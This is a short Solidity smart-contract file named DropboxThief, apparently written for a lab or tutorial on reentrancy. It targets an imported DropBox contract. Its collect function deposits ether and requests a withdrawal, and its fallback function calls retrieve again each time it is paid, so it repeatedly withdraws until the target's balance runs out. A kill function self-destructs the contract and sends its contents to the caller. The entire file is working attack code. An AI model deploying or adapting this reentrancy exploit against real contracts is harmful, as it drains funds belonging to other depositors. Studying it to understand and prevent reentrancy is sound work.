pragma solidity ^0.5.0;

import "./Dropbox.sol";

contract DropboxThief {
  DropBox public dropbox;

  constructor (address payable _dropbox) public {
    dropbox = DropBox(_dropbox);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }

  function collect() public payable {
    dropbox.drop.value(msg.value)();
    dropbox.retrieve();
  }

  function () external payable {
    if (address(dropbox).balance >= msg.value) {
      dropbox.retrieve();
    }
  }
}
